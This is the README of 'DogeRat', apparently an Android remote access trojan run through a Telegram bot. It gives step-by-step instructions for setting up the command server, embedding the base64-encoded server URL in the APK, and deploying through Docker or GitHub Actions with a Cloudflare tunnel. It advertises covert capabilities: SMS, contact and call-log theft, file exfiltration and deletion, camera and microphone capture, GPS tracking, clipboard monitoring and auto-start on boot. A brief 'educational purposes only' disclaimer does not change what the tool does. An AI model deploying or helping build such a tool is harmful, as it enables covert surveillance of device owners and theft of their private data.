<h1 align="center">DogeRat</h1>

<p align="center">
  <img src="assets/logo.PNG" alt="logo" style="max-width: 100%; height: auto;" />
</p>

<p align="center"><i>A multifunctional Telegram-based Android RAT without port forwarding</i></p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-1.0.0-stable?style=for-the-badge&color=blue" />
  <img src="https://img.shields.io/badge/Status-Stable-brightgreen?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Android-14%2B-green?style=for-the-badge&logo=android" />
  <img src="https://img.shields.io/badge/Kotlin-1.9.10-purple?style=for-the-badge&logo=kotlin" />
  <img src="https://img.shields.io/badge/Node.js-20%2B-green?style=for-the-badge&logo=node.js" />
</p>

---

<h2 align="center">Panel Screenshot</h2>

<p align="center">
  <img src="assets/panel.jpg" alt="Panel Screenshot" style="max-width: 100%; height: auto;" />
</p>

---

## 📥 Downloads

### Stable Release v1.0.0

| Package | Description | Download |
|---------|-------------|----------|
| **🚀 Deploy Server & APK** | One-click deploy with tunnel | [Run Workflow](../../actions/workflows/deploy-server-build-apk.yml) |
| 📱 Android APK | Debug/Release APK | [Download v1.0.0](../../releases/tag/v1.0.0) |

---

## 🔧 Quick Start

### 1. Server Setup

```bash
# Clone the repository
git clone https://github.com/fahimahamed1/DogeRat.git
cd Dogerat/server

# Install dependencies
npm install

# Create environment file
cp .env.example .env
# Edit .env with your bot token and chat ID

# Start the server
npm start
```

### 2. Build Android App

#### Option A: Using GitHub Actions (Recommended)
1. Push your code to GitHub
2. Go to Actions tab
3. Select "Build Android APK" workflow
4. Click "Run workflow"
5. Download the APK from Artifacts

#### Option B: Local Build
```bash
cd Dogerat/app
./gradlew assembleRelease
```

### 3. Configure the App

Before building locally, you need to configure your server URL in `app/app/src/main/java/willi/fiend/Utils/AppTools.kt`:

**Step 1:** Find the `DEFAULT_DATA` constant:

```kotlin
// Your server configuration (Base64 encoded JSON)
private const val DEFAULT_DATA = ""
```

**Step 2:** Generate your Base64 encoded JSON:

```bash
# Replace with your server URL
echo -n '{"host":"https://your-server.com/","socket":"wss://your-server.com/","webView":"https://google.com/"}' | base64
```

**Step 3:** Paste the Base64 string into `DEFAULT_DATA`:

```kotlin
private const val DEFAULT_DATA = "eyJob3N0IjoiaHR0cHM6Ly95b3VyLXNlcnZlci5jb20vIiwic29ja2V0Ijoid3NzOi8veW91ci1zZXJ2ZXIuY29tLyIsIndlYlZpZXciOiJodHRwczovL2dvb2dsZS5jb20vIn0="
```

**JSON format:**
```json
{
  "host": "https://your-server.com/",
  "socket": "wss://your-server.com/",
  "webView": "https://google.com/"
}
```

**Default values (for Android emulator):**
```kotlin
private val DEFAULT_APP_DATA = AppData(
    host = "http://10.0.2.2:8999/",
    socket = "ws://10.0.2.2:8999/",
    webView = "https://www.google.com"
)
```

> 💡 **Tip:** If `DEFAULT_DATA` is empty, the app will use `DEFAULT_APP_DATA` which is configured for Android emulator (`10.0.2.2` = localhost).

---

## 🐳 Docker Deployment

```bash
# Build the image
cd server
docker build -t dogerat-server .

# Run the container
docker run -d \
  -p 8999:8999 \
  -e TELEGRAM_BOT_TOKEN=your_bot_token \
  -e TELEGRAM_CHAT_ID=your_chat_id \
  dogerat-server
```

---

## 🔄 GitHub Actions

The project includes automated CI/CD workflows:

### 🚀 Deploy Server & Build APK (Recommended)
This is an all-in-one workflow that:
1. Deploys the server on GitHub Actions runner
2. Creates a Cloudflare tunnel for public access
3. Configures the APK with the tunnel URL
4. Builds the APK ready to use

**How to use:**
1. Go to **Actions** tab
2. Select **"Deploy Server & Build APK"** workflow
3. Click **"Run workflow"**
4. Optionally provide your Telegram Chat ID
5. Wait for the build to complete
6. Download the APK from **Artifacts**

**Important Notes:**
- The Cloudflare tunnel URL changes each deployment
- Download and install the APK immediately after build
- The server runs for the duration of the GitHub Actions job
- You need to set `TELEGRAM_BOT_TOKEN` secret in your repository settings

### Android Build Workflow
- Triggers on push to main/master branch
- Builds debug APK
- Uploads APK as artifact

### Server Deploy Workflow
- Triggers on changes to server directory
- Builds Node.js package tarball
- Creates GitHub release

---

## 🛠️ Configuration

### Environment Variables

| Variable | Description | Required |
|----------|-------------|----------|
| `TELEGRAM_BOT_TOKEN` | Your Telegram bot token | Yes |
| `TELEGRAM_CHAT_ID` | Your Telegram chat ID | Yes |
| `PORT` | Server port (default: 8999) | No |
| `PING_ADDRESS` | Keep-alive ping address | No |

---

## ✨ Features

| Category | Features |
|----------|----------|
| **📱 Device Control** | Real-time commands, Navigation keys, Volume control, Vibrate, Torch |
| **📨 Messaging** | SMS read/send, Contacts access, Call logs |
| **📁 File System** | Browse, Download, Delete files |
| **📷 Media** | Front/Rear camera capture, Microphone recording |
| **📍 Location** | GPS tracking |
| **🔔 Notifications** | Read notifications, Send custom notifications |
| **📋 Other** | Clipboard monitor, Toast messages, Auto start on boot |
| **🤖 Control** | Full Telegram bot interface |
| **🛡️ Modern** | Android 14+ support, WebSocket communication |

---

## 📁 Project Structure

```
DogeRat/
├── app/                           # Android Application
│   ├── app/src/main/java/         # Kotlin source code
│   └── app/build.gradle           # Version configuration
│
├── server/                        # Node.js Server
│   ├── server.js                  # Main server file
│   └── package.json               # Version configuration
│
└── .github/workflows/             # GitHub Actions
    ├── deploy-server-build-apk.yml    # One-click deploy
    ├── android-build.yml              # Build APK only
    └── server-test.yml                # Server testing
```

---

## 📦 Requirements

### Development
- Android Studio Hedgehog+
- JDK 17
- Node.js 20+
- npm

### Deployment
- GitHub account with Actions
- Telegram Bot Token
- Telegram Chat ID

---

## ⚠️ Disclaimer

<p align="center">
  <img src="https://img.shields.io/badge/Disclaimer-Important-red?style=for-the-badge" />
</p>

> 🛡️ This tool is for **educational purposes only**.  
> 🚫 Use only on devices you **own or have permission to control**.  
> 📛 Unauthorized access to computer systems is illegal.

---

## 🛠 Technology Stack

<p align="center">
  <img src="https://img.shields.io/badge/Backend-Node.js-339933?logo=node.js&style=flat-square" />
  <img src="https://img.shields.io/badge/Frontend-Kotlin-7F52FF?logo=kotlin&style=flat-square" />
  <img src="https://img.shields.io/badge/Communication-WebSocket-FF6B6B?style=flat-square" />
  <img src="https://img.shields.io/badge/API-Telegram-26A5E4?logo=telegram&style=flat-square" />
</p>

---

<p align="center">
  <b>DogeRat Stable Release</b><br>
  <i>Made with ❤️ for educational purposes</i>
</p>
